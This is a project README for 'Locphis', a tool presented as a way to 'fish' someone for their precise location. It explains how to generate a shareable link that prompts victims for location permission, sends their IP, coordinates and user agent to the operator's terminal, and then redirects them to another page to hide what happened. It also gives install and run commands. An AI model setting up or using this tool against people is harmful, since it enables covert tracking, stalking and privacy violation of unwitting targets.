# Locphis 🎣 👤
<p>
Locphis is a tool for fishing someone with the aim of 
getting (99%) accurate location
  
Locphis will send a request for allowing location access
</p>

## Example:
#### When the Script is run: 
<a><img src="https://i.ibb.co.com/0F6BK4C/20241023-014450.jpg" alt="locphis" border="0"></a>
displays a link that can be shared with 
everyone to get location access permissions.
#### When the link is accessed
<a><img src="https://i.ibb.co.com/ryk40x7/Screenshot-20241023-012638-Chrome.jpg" alt="Image2" border="0"></a>
When the link is accessed, it will display a request to 
allow location access to the user.

Once the request is allowed by the user. 
IP, Location and User Agent will be displayed in the Terminal.
<a><img src="https://i.ibb.co.com/99TNdw1/Screenshot-20241023-012754-Termux.jpg" alt="Image3" border="0"></a>

Users will also be redirected to another 
link after allowing the access and must be set first so 
that users can be directed to other links

#### Redirect to another link 
To change it, you can access the ****public****
folder first to edit the `script.js` file. 
```javascript
xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            window.location.href = `https://example.com`; //go to another link 
        }
    };
```

## Tested On:
- Termux
- Ubuntu

## Installation:
**Requirement** : Nodejs version 20+ and Git

You can install it if you don't have one yet 
```bash
apt install nodejs git -y
```
**Install Script** :
```bash
git clone https://github.com/ZeltNamizake/locphis
```
**Edit File Script.js**:
Before running the script you must edit the `script.js` 
file located in the **public** folder. 
```bash
cd locphis/public
```
if it has been changed, you can run the script by means
```bash
cd ..
node locphis
```

###### Created by  ```Driyas (ZeltNamizake)```
